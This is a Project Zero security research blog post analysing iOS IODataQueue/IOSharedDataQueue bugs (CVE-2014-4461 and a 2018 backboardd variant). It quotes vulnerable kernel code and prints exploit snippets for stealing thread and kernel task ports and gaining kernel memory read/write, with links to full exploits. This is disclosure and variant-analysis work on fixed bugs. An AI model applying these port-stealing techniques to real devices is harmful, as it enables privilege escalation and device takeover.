---
source: p0
source_url: https://projectzero.google/2018/10/deja-xnu.html
title: "Deja-XNU - Project Zero"
description: "Posted by Ian Beer, Google Project ZeroThis blog post revisits an old bug found by Pangu Team and..."
---

Posted by Ian Beer, Google Project Zero

This blog post revisits an old bug found by Pangu Team and combines it with a new, albeit very similar issue I recently found to try to build a "perfect" exploit for iOS 7.1.2.

State of the art

An idea I've wanted to play with for a while is to revisit old bugs and try to exploit them again, but using what I've learnt in the meantime about iOS. My hope is that it would give an insight into what the state-of-the-art of iOS exploitation could have looked like a few years ago, and might prove helpful if extrapolated forwards to think about what state-of-the-art exploitation might look like now.

So let's turn back the clock to 2014...

Pangu 7

On June 23 2014 [@PanguTeam](https://twitter.com/panguteam) released the [Pangu 7 jailbreak for iOS 7.1-7.1.x](http://en.7.pangu.io/). They exploited [a lot of bugs](https://www.theiphonewiki.com/wiki/Jailbreak_Exploits#Pangu_.287.1_.2F_7.1.1_.2F_7.1.2.29). The issue we're interested in is CVE-2014-4461 which [Apple described as](https://support.apple.com/en-us/HT204418): A validation issue ... in the handling of certain metadata fields of IOSharedDataQueue objects. This issue was addressed through relocation of the metadata.

(Note that this kernel bug wasn't actually fixed in iOS 8 and Pangu reused it for [Pangu 8](https://www.theiphonewiki.com/wiki/Jailbreak_Exploits#Pangu8_.288.0_.2F_8.0.1_.2F_8.0.2_.2F_8.1.29)...)

Queuerious...

Looking at the [iOS 8-era](https://support.apple.com/en-us/HT201395) release notes you'll see that Pangu and I had found some bugs in similar areas:

- IOKit


Available for: iPhone 4s and later, iPod touch (5th generation) and later, iPad 2 and later

Impact: A malicious application may be able to execute arbitrary code with system privileges

Description: A validation issue existed in the handling of certain metadata fields of IODataQueue objects. This issue was addressed through improved validation of metadata.

CVE-2014-4418 : Ian Beer of Google Project Zero

- IOKit


Available for: iPhone 4s and later, iPod touch (5th generation) and later, iPad 2 and later

Impact: A malicious application may be able to execute arbitrary code with system privileges

Description: A validation issue existed in the handling of certain metadata fields of IODataQueue objects. This issue was addressed through improved validation of metadata.

CVE-2014-4388 : @PanguTeam

- IOKit


Available for: iPhone 4s and later, iPod touch (5th generation) and later, iPad 2 and later

Impact: A malicious application may be able to execute arbitrary code with system privileges

Description: An integer overflow existed in the handling of IOKit functions. This issue was addressed through improved validation of IOKit API arguments.

CVE-2014-4389 : Ian Beer of Google Project Zero

IODataQueue

I had looked at the IOKit class IODataQueue, which the header file IODataQueue.h tells us "is designed to allow kernel code to queue data to a user process." It does this by creating a lock-free queue data-structure in shared memory.

IODataQueue was quite simple, there were only two fields: dataQueue and notifyMsg:

class IODataQueue : public OSObject

{

OSDeclareDefaultStructors(IODataQueue)

protected:

IODataQueueMemory \* dataQueue;

void \* notifyMsg;

public:

static IODataQueue \*withCapacity(UInt32 size);

static IODataQueue \*withEntries(UInt32 numEntries, UInt32 entrySize);

virtual Boolean initWithCapacity(UInt32 size);

virtual Boolean initWithEntries(UInt32 numEntries, UInt32 entrySize);

virtual Boolean enqueue(void \*data, UInt32 dataSize);

virtual void setNotificationPort(mach\_port\_t port);

virtual IOMemoryDescriptor \*getMemoryDescriptor();

};

Here's the entire implementation of IODataQueue, as it was around iOS 7.1.2:

OSDefineMetaClassAndStructors(IODataQueue, OSObject)

IODataQueue \*IODataQueue::withCapacity(UInt32 size)

{

    IODataQueue \*dataQueue = new IODataQueue;

    if (dataQueue) {

        if (!dataQueue->initWithCapacity(size)) {

            dataQueue->release();

            dataQueue = 0;

        }

    }

    return dataQueue;

}

IODataQueue \*IODataQueue::withEntries(UInt32 numEntries, UInt32 entrySize)

{

    IODataQueue \*dataQueue = new IODataQueue;

    if (dataQueue) {

        if (!dataQueue->initWithEntries(numEntries, entrySize)) {

            dataQueue->release();

            dataQueue = 0;

        }

    }

    return dataQueue;

}

Boolean IODataQueue::initWithCapacity(UInt32 size)

{

    vm\_size\_t allocSize = 0;

    if (!super::init()) {

        return false;

    }

    allocSize = round\_page(size + DATA\_QUEUE\_MEMORY\_HEADER\_SIZE);

    if (allocSize < size) {

        return false;

    }

    dataQueue = (IODataQueueMemory \*)IOMallocAligned(allocSize, PAGE\_SIZE);

    if (dataQueue == 0) {

        return false;

    }

    dataQueue->queueSize    = size;

    dataQueue->head         = 0;

    dataQueue->tail         = 0;

    return true;

}

Boolean IODataQueue::initWithEntries(UInt32 numEntries, UInt32 entrySize)

{

return (initWithCapacity((numEntries + 1) \* (DATA\_QUEUE\_ENTRY\_HEADER\_SIZE + entrySize)));

}

void IODataQueue::free()

{

    if (dataQueue) {

        IOFreeAligned(dataQueue, round\_page(dataQueue->queueSize \+ DATA\_QUEUE\_MEMORY\_HEADER\_SIZE));

    }

    super::free();

    return;

}

Boolean IODataQueue::enqueue(void \* data, UInt32 dataSize)

{

    const UInt32       head = dataQueue->head;  // volatile

    const UInt32       tail = dataQueue->tail;

const UInt32       entrySize = dataSize + DATA\_QUEUE\_ENTRY\_HEADER\_SIZE;

    IODataQueueEntry \* entry;

    if ( tail >= head )

    {

        // Is there enough room at the end for the entry?

        if ( (tail + entrySize) <= dataQueue->queueSize )

        {

            entry = (IODataQueueEntry \*)((UInt8 \*)dataQueue->queue + tail);

            entry->size = dataSize;

            memcpy(&entry->data, data, dataSize);

            // The tail can be out of bound when the size of the new entry

            // exactly matches the available space at the end of the queue.

            // The tail can range from 0 to dataQueue->queueSize inclusive.

            dataQueue->tail += entrySize;

        }

        else if ( head > entrySize ) // Is there enough room at the beginning?

        {

            // Wrap around to the beginning, but do not allow the tail to catch

            // up to the head.

            dataQueue->queue->size = dataSize;

            // We need to make sure that there is enough room to set the size before

            // doing this. The user client checks for this and will look for the size

            // at the beginning if there isn't room for it at the end.

            if ( ( dataQueue->queueSize - tail ) >= DATA\_QUEUE\_ENTRY\_HEADER\_SIZE )

            {

                ((IODataQueueEntry \*)((UInt8 \*)dataQueue->queue + tail))->size = dataSize;

            }

            memcpy(&dataQueue->queue->data, data, dataSize);

            dataQueue->tail = entrySize;

        }

        else

        {

            return false;// queue is full

        }

    }

    else

    {

        // Do not allow the tail to catch up to the head when the queue is full.

        // That's why the comparison uses a '>' rather than '>='.

        if ( (head - tail) > entrySize )

        {

            entry = (IODataQueueEntry \*)((UInt8 \*)dataQueue->queue + tail);

            entry->size = dataSize;

            memcpy(&entry->data, data, dataSize);

            dataQueue->tail += entrySize;

        }

        else

        {

            return false;// queue is full

        }

    }

    // Send notification (via mach message) that data is available.

    if ( ( head == tail )                /\* queue was empty prior to enqueue() \*/

    \|\| ( dataQueue->head == tail ) )   /\* queue was emptied during enqueue() \*/

    {

        sendDataAvailableNotification();

    }

    return true;

}

void IODataQueue::setNotificationPort(mach\_port\_t port)

{

    static struct \_notifyMsg init\_msg = { {

        MACH\_MSGH\_BITS(MACH\_MSG\_TYPE\_COPY\_SEND, 0),

        sizeof (struct \_notifyMsg),

        MACH\_PORT\_NULL,

        MACH\_PORT\_NULL,

        0,

        0

    } };

    if (notifyMsg == 0) {

        notifyMsg = IOMalloc(sizeof(struct \_notifyMsg));

    }

    \*((struct \_notifyMsg \*)notifyMsg) = init\_msg;

    ((struct \_notifyMsg \*)notifyMsg)->h.msgh\_remote\_port = port;

}

void IODataQueue::sendDataAvailableNotification()

{

    kern\_return\_tkr;

    mach\_msg\_header\_t \*msgh;

    msgh = (mach\_msg\_header\_t \*)notifyMsg;

    if (msgh && msgh->msgh\_remote\_port) {

        kr = mach\_msg\_send\_from\_kernel\_proper(msgh, msgh->msgh\_size);

        switch(kr) {

            case MACH\_SEND\_TIMED\_OUT:// Notification already sent

            case MACH\_MSG\_SUCCESS:

                break;

            default:

                IOLog("%s: dataAvailableNotification failed - msg\_send returned: %d\\n", /\*getName()\*/"IODataQueue", kr);

                break;

        }

    }

}

IOMemoryDescriptor \*IODataQueue::getMemoryDescriptor()

{

    IOMemoryDescriptor \*descriptor = 0;

    if (dataQueue != 0) {

        descriptor = IOMemoryDescriptor::withAddress(dataQueue, dataQueue->queueSize \+ DATA\_QUEUE\_MEMORY\_HEADER\_SIZE, kIODirectionOutIn);

    }

    return descriptor;

}

The ::initWithCapacity method allocates the buffer which will end up in shared memory. We can see from the cast that the structure of the memory looks like this:

typedef struct \_IODataQueueMemory {

    UInt32            queueSize;

    volatile UInt32   head;

    volatile UInt32   tail;

    IODataQueueEntry  queue\[1\];

} IODataQueueMemory;

The ::setNotificationPort method allocated a mach message header structure via IOMalloc when it was first called and stored the buffer as notifyMsg.

The ::enqueue method was responsible for writing data into the next free slot in the queue, potentially wrapping back around to the beginning of the buffer.

Finally, ::getMemoryDescriptor created an IOMemoryDescriptor object which wrapped the dataQueue memory to return to userspace.

IODataQueue.cpp was 243 lines, including license and comments. I count at least 6 bugs, which I've highlighted in the code. There's only one integer overflow check but there are multiple obvious integer overflow issues. The other problems stemmed from the fact that the only place where the IODataQueue was storing the queue's length was in the shared memory which userspace could modify.

This lead to obvious memory corruption issues in ::enqueue since userspace could alter the queueSize, head and tail fields and the kernel had no way to verify whether they were within the bounds of the queue buffer. The other two uses of the queueSize field also yielded interesting bugs: The ::free method has to trust the queueSize field, and so will make an oversized IOFree. Most interesting of all however is ::getMemoryDescriptor, which trusts queueSize when creating the IOMemoryDescriptor. If the kernel code which was using the IODataQueue allowed userspace to get multiple memory descriptors this would have let us get an oversized memory descriptor, potentially giving us read/write access to other kernel heap objects.

Back to Pangu

Pangu's kernel code exec bug isn't in IODataQueue but in the subclass IOSharedDataQueue. IOSharedDataQueue.h tells us that the "IOSharedDataQueue class is designed to also allow a user process to queue data to kernel code."

IOSharedDataQueue adds one (unused) field:

    struct ExpansionData {

    };

    /\*! @var reserved

        Reserved for future use.  (Internal use only) \*/

    ExpansionData \* \_reserved;

IOSharedDataQueue doesn't override the ::enqueue method, but adds a ::dequeue method to allow the kernel to dequeue objects which userspace has enqueued.

::dequeue had the same problems as ::enqueue with the queue size being in shared memory, which could lead the kernel to read out of bounds. But strangely that wasn't the only change in IOSharedDataQueue. Pangu noticed that IOSharedDataQueue also had a much more curious change in its overridden version of ::initWithCapacity:

Boolean IOSharedDataQueue::initWithCapacity(UInt32 size)

{

    IODataQueueAppendix \*   appendix;

    if (!super::init()) {

        return false;

    }

    dataQueue = (IODataQueueMemory \*)IOMallocAligned(round\_page(size + DATA\_QUEUE\_MEMORY\_HEADER\_SIZE + DATA\_QUEUE\_MEMORY\_APPENDIX\_SIZE), PAGE\_SIZE);

    if (dataQueue == 0) {

        return false;

    }

    dataQueue->queueSize = size;

    dataQueue->head = 0;

    dataQueue->tail = 0;

    appendix = (IODataQueueAppendix \*)((UInt8 \*)dataQueue + size + DATA\_QUEUE\_MEMORY\_HEADER\_SIZE);

    appendix->version = 0;

    notifyMsg = &(appendix->msgh);

    setNotificationPort(MACH\_PORT\_NULL);

    return true;

}

IOSharedDataQueue increased the size of the shared memory buffer to also add space for an IODataQueueAppendix structure:

typedef struct \_IODataQueueAppendix {

    UInt32 version;

    mach\_msg\_header\_t msgh;

} IODataQueueAppendix;

This contains a version field and, strangely, a mach message header. Then on this line:

notifyMsg = &(appendix->msgh);

the notifyMsg member of the IODataQueue superclass is set to point in to that appendix structure.

Recall that IODataQueue allocated a mach message header structure via IOMalloc when a notification port was first set, so why did IOSharedDataQueue do it differently? About the only plausible explanation I can come up with is that a developer had noticed that the dataQueue memory allocation typically wasted almost a page of memory, because clients asked for a page-multiple number of bytes, then the queue allocation added a small header to that and rounded up to a page-multiple again. This change allowed you to save a single 0x18 byte kernel allocation per queue. Given that this change seems to have landed right around the launch date of the first iPhone, a memory constrained device with no swap, I could imagine there was a big drive to save memory.

But the question is: can you put a mach message header in shared memory like that?

What's in a message?

Here's the definition of mach\_msg\_header\_t, as it was in iOS 7.1.2:

typedef struct

{

mach\_msg\_bits\_t  msgh\_bits;

mach\_msg\_size\_t  msgh\_size;

mach\_port\_t      msgh\_remote\_port;

mach\_port\_t      msgh\_local\_port;

mach\_msg\_size\_t  msgh\_reserved;

mach\_msg\_id\_t    msgh\_id;

} mach\_msg\_header\_t;

(The msgh\_reserved field has since become msgh\_voucher\_port with the introduction of vouchers.)

Both userspace and the kernel appear at first glance to have the same definition of this structure, but upon closer inspection if you resolve all the typedefs you'll see this very important distinction:

userspace:

typedef \_\_darwin\_mach\_port\_t mach\_port\_t;

typedef \_\_darwin\_mach\_port\_name\_t \_\_darwin\_mach\_port\_t;

typedef \_\_darwin\_natural\_t \_\_darwin\_mach\_port\_name\_t;

typedef unsigned int \_\_darwin\_natural\_t

kernel:

typedef ipc\_port\_t mach\_port\_t;

typedef struct ipc\_port \*ipc\_port\_t;

In userspace mach\_port\_t is an unsigned 32-bit integer which is a task-local name for a port, but in the kernel a mach\_port\_t is a raw pointer to the underlying ipc\_port structure.

Since the kernel is the one responsible for initializing the notification message, and is the one sending it, it seems that the kernel is writing kernel pointers into userspace shared memory!

Fast-forward

Before we move on to writing a new exploit for that old issue let's jump forward to 2018, and why exactly I'm looking at this old code again.

I've recently spoken publicly about the importance of variant analysis, and I thought it was important to actually do some variant analysis myself before I gave that talk. By variant analysis, I mean taking a known security bug and looking for code which is vulnerable in a similar way. That could mean searching a codebase for all uses of a particular API which has exploitable edge cases, or even just searching for a buggy code snippet which has been copy/pasted into a different file.

Userspace queues and deja-xnu

This summer while looking for variants of the old IODataQueue issues I saw something I hadn't noticed before: as well as the facilities for enqueuing and dequeue objects to and from kernel-owned IODataQueues, the userspace IOKit.framework also contains code for creating userspace-owned queues, for use only between userspace processes.

The code for creating these queues isn't in the [open-source IOKitUser package](https://opensource.apple.com/tarballs/IOKitUser/IOKitUser-1445.40.1.tar.gz); you can only see this functionality by reversing the IOKit framework binary.

There are no users of this code in the IOKitUser source, but some reversing showed that the userspace-only queues were used by the com.apple.iohideventsystem MIG service, implemented in IOKit.framework and hosted by backboardd on iOS and hidd on MacOS. You can talk to this service from inside the app sandbox on iOS.

Reading the userspace \_\_IODataQueueEnqueue method, which is used to enqueue objects into both userspace and kernel queues, I had a strong feeling of deja-xnu: It was trusting the queueSize value in the queue header in shared memory, just like [CVE-2014-4418](https://bugs.chromium.org/p/project-zero/issues/detail?id=36) from 2014 did. Of course, if the kernel is the other end of the queue then this isn't interesting (since the kernel doesn't trust these values) but we now know that there are userspace only queues, where the other end is another userspace process.

Reading more of the userspace IODataQueue handling code I noticed that unlike the kernel IODataQueue object, the userspace one had an appendix as well as header. And in that appendix, like IOSharedDataQueue, it stored a mach message header! Did this userspace IODataQueue have the same issue as the IOSharedDataQueue issue from Pangu 7/8? Let's look at the code:

IOReturn IODataQueueSetNotificationPort(IODataQueueMemory \*dataQueue, mach\_port\_t notifyPort)

{

    IODataQueueAppendix \* appendix = NULL;

    UInt32 queueSize = 0;

    if ( !dataQueue )

        return kIOReturnBadArgument;

    queueSize = dataQueue->queueSize;

    appendix = (IODataQueueAppendix \*)((UInt8 \*)dataQueue + queueSize + DATA\_QUEUE\_MEMORY\_HEADER\_SIZE);

    appendix->msgh.msgh\_bits        = MACH\_MSGH\_BITS(MACH\_MSG\_TYPE\_COPY\_SEND, 0);

    appendix->msgh.msgh\_size        = sizeof(appendix->msgh);

    appendix->msgh.msgh\_remote\_port = notifyPort;

    appendix->msgh.msgh\_local\_port  = MACH\_PORT\_NULL;

    appendix->msgh.msgh\_id          = 0;

    return kIOReturnSuccess;

}

We can take a look in lldb at the contents of the buffer and see that at the end of the queue, still in shared memory, we can see a mach message header, where the name field is the remote end's name for the notification port we provided!

Exploitation of an arbitrary mach message send

In XNU each task (process) has a task port, and each thread within a task has a thread port. Originally a send right to a task's task port gave full memory and thread control, and a send right to a thread port meant full thread control (which is of course also full memory control.)

As a result of the exploits which I and others have released abusing issues with mach ports to steal port rights Apple have very slowly been hardening these interfaces. But as of iOS 11.4.1 if you have a send right to a thread port belonging to another task you can still use it to manipulate the register state of that thread.

Interestingly process startup on iOS is sufficiently deterministic that in backboardd on iOS 7.1.2 on an iPhone 4 right up to iOS 11.4.1 on an iPhone SE, 0x407 names a thread port.

Stealing ports

The msgh\_local\_port field in a mach message is typically used to give the recipient of a message a send-once right to a "reply port" which can be used to send a reply. This is just a convention and any send or send-once right can be transferred here. So by rewriting the mach message in shared memory which will be sent to us to set the msgh\_local\_port field to 0x407 (backboardd's name for a thread port) and the msgh\_bits field to use a COPY\_SEND disposition for the local port, when the notification message is sent to us by backboardd we'll receive a send right to a backboardd thread port!

[This exploit for this issue](https://bugs.chromium.org/p/project-zero/issues/attachment?aid=363722&signed_aid=dgawgVN3KemTxvkk6-OE_Q==) targets iOS 11.4.1, and contains a modified version of the remote\_call code from triple\_fetch to work with a stolen thread port rather than a task port.

Back to 2014

I mentioned that Apple have slowly been adding mitigations against the use of stolen task ports. The first of these mitigations I'm aware of was to prevent userspace using the kernel task port, often known as task-for-pid-0 or TFP0, which is the task port representing the kernel task (and hence allowing read/write access to kernel memory). I believe this was done in response to my [mach\_portal](https://bugs.chromium.org/p/project-zero/issues/detail?id=965) exploit which used a kernel use-after-free to steal a send right to the kernel task port.

Prior to that hardening, if you had a send right to the kernel task port you had complete read/write access to kernel memory.

We've seen that port name allocation is extremely stable, with the same name for a thread port for four years. Is the situation similar for the ipc\_port pointers used in the kernel in mach messages?

Very early kernel port allocation is also deterministic. I abused this in mach\_portal to steal the kernel task port by first determining the address of the host port then guessing that the kernel task port must be nearby since they're both very early port allocations.

Back in 2014 things were even easier because the kernel task port was at a fixed offset from the host port; all we need to do is leak the address of the host port then we can compute the address of the kernel task port!

Determining port addresses

IOHIDEventService is a userclient which exposes an IOSharedDataQueue to userspace. We can't open this from inside the app sandbox, but the exploit for the userspace IODataQueue bug was easy enough to backport to 32-bit iOS 7.1.2, and we can open an IOHIDEventService userclient from backboardd.

The sandbox only prevents us from actually opening the userclient connection. We can then transfer the mach port representing this connection back to our sandboxed app and continue the exploit from there. Using the code I wrote for triple\_fetch we can easily use backboardd's task port which we stole (using the userspace IODataQueue bug) to open an IOKit userclient connection and move it back:

uint32\_t remote\_matching =

task\_remote\_call(bbd\_task\_port,

IOServiceMatching,

                   1,

                   REMOTE\_CSTRING("IOHIDEventService"));

uint32\_t remote\_service =

task\_remote\_call(bbd\_task\_port,

IOServiceGetMatchingService,

                   2,

                   REMOTE\_LITERAL(0),

                   REMOTE\_LITERAL(remote\_matching));

uint32\_t remote\_conn = 0;

uint32\_t remote\_err =

task\_remote\_call(bbd\_task\_port,

IOServiceOpen,

                   4,

                   REMOTE\_LITERAL(remote\_service),

                   REMOTE\_LITERAL(0x1307), // remote mach\_task\_self()

                   REMOTE\_LITERAL(0),

                   REMOTE\_OUT\_BUFFER(&remote\_conn,

                                     sizeof(remote\_conn)));

mach\_port\_t conn =

pull\_remote\_port(bbd\_task\_port,

                   remote\_conn,

                   MACH\_MSG\_TYPE\_COPY\_SEND);

We then just need to call external method 0 to "open" the queue and IOConnectMapMemory to map the queue shared memory into our process and find the mach message header:

vm\_address\_t qaddr = 0;

vm\_size\_t qsize = 0;

IOConnectMapMemory(conn,

                   0,

                   mach\_task\_self(),

                   &qaddr,

                   &qsize,

                   1);

mach\_msg\_header\_t\* shm\_msg =

(mach\_msg\_header\_t\*)(qaddr + qsize - 0x18);

In order to set the queue's notification port we need to call [IOConnectSetNotificationPort](https://developer.apple.com/documentation/iokit/1514541-ioconnectsetnotificationport?language=objc) on the userclient:

mach\_port\_t notification\_port = MACH\_PORT\_NULL;

mach\_port\_allocate(mach\_task\_self(),

                   MACH\_PORT\_RIGHT\_RECEIVE,

                   &notification\_port);

uint64\_t ref\[8\] = {0};

IOConnectSetNotificationPort(conn,

                             0,

                             notification\_port,

                             ref);

We can then see the kernel address of that port's ipc\_port in the shared memory message:

+0x00001010 00000013  // msgh\_bits

+0x00001014 00000018  // msgh\_size

+0x00001018 99a3e310  // msgh\_remote\_port

+0x0000101c 00000000  // msgh\_local\_port

+0x00001020 00000000  // msgh\_reserved

+0x00001024 00000000  // msgh\_id

We now need to determine the heap address of an early kernel port. If we just call IOConnectSetNotificationPort with a send right to the host\_self port, we get an error:

IOConnectSetNotificationPort error: 1000000a (ipc/send) invalid port right

This error is actually from the MIG client code telling us that the MIG serialized message failed to send. IOConnectSetNotificationPort is a thin wrapper around the MIG generated io\_conenct\_set\_notification\_port client code. Let's take a look in device.defs which is the source file used by MIG to generate the RPC stubs for IOKit:

routine io\_connect\_set\_notification\_port(

    connection        : io\_connect\_t;

in notification\_type : uint32\_t;

in port              : mach\_port\_make\_send\_t;

in reference         : uint32\_t);

Here we can see that the port argument is defined as a mach\_port\_make\_send\_t which means that the MIG code will send the port argument in a port descriptor with a disposition of MACH\_MSG\_TYPE\_MAKE\_SEND, which requires the sender to hold a receive right. But in mach there is no way for the receiver to determine whether the sender held a receive right for a send right which you received or instead sent you a copy via MACH\_MSG\_TYPE\_COPY\_SEND. This means that all we need to do is modify the MIG client code to use a COPY\_SEND disposition and then we can set the queue's notification port to any send right we can acquire, irrespective of whether we hold a receive right.

Doing this and passing the name we get from mach\_host\_self() we can learn the host port's kernel address:

host port: 0x8e30cee0

Leaking a couple of early ports which are likely to come from the same memory page and finding the greatest common factor gives us a good guess for the size of an ipc\_port\_t in this version of iOS:

master port: 0x8e30c690

host port: 0x8e30cee0

GCF(0x690, 0xee0) = 0x70

Looking at the XNU source we can see that the host port is allocated before the kernel task port, and since this was before the zone allocator freelist randomisation mitigation was introduced this means that the address of the kernel task port will be somewhere below the host port.

By setting the msgh\_local\_port field to the address of the host port - 0x70, then decrementing it by 0x70 each time we receive a notification message we will be sent a different early port each time a notification message is sent. Doing this we learn that the kernel task port is allocated 5 ports after the host port, meaning that the address of the kernel task port is host\_port\_kaddr - (5\*0x70).

Putting it all together

You can get my [exploit for iOS 7.1.2 here](https://bugs.chromium.org/p/project-zero/issues/attachment?aid=363723&signed_aid=TglZ4wkmOqrc8W3XQX8fww==), I've only tested it on an iPhone 4. You'll need to use an old version of XCode to build and run it; I'm using XCode 7.3.1.

Launch the app, press the home button to trigger an HID notification message and enjoy read/write access to kernel memory. :)

In 2014 then it seems that with enough OS internals knowledge and the right set of bugs it was pretty easy to build a logic bug chain to get kernel memory read write. Things have certainly changed since then, but I'd be interested to compare this post with another one in 2022 looking back to 2018.

Lessons

Variant analysis is really important, but attackers are the only parties incentivized to do a good job of it. Why did the userspace variant of this IODataQueue issue persist for four more years after almost the exact same bug was fixed in the kernel code?

Let's also not underplay the impact that just the userspace version of the bug alone could have had. Prior to mach\_portal, due to a design quirk of the com.apple.iohideventsystem MIG service backboardd had send rights to a large number of other process's task ports, meaning that a compromise of backboardd was also a compromise of those tasks.

Some of those tasks ran as root meaning they could have exploited the [processor\_set\_tasks vulnerability](http://newosxbook.com/articles/PST2.html) to get the task ports for any task on the device, which despite being a known issue also wasn't fixed until I exploited it in triple\_fetch.

This IODataQueue issue wasn't the only variant I found as part of this project; the deja-xnu project for iOS 11.4.1 also contains PoC code to trigger a [MIG code generation bug](https://bugs.chromium.org/p/project-zero/issues/detail?id=1658) in clients of backboardd, and the project zero tracker has [details](https://bugs.chromium.org/p/project-zero/issues/detail?id=1625) of [further issues](https://bugs.chromium.org/p/project-zero/issues/detail?id=1629).

A final note on security bulletins

You'll notice that none of the issues I've linked above are mentioned in the iOS 12 security bulletin, despite being fixed in that release. Apple are still yet to assign CVEs for these issues or publicly acknowledge that they were fixed in iOS 12. In my opinion a security bulletin should mention the security bugs that were fixed. Not doing so provides a disincentive for people to update their devices since it appears that there were fewer security fixes than there really were.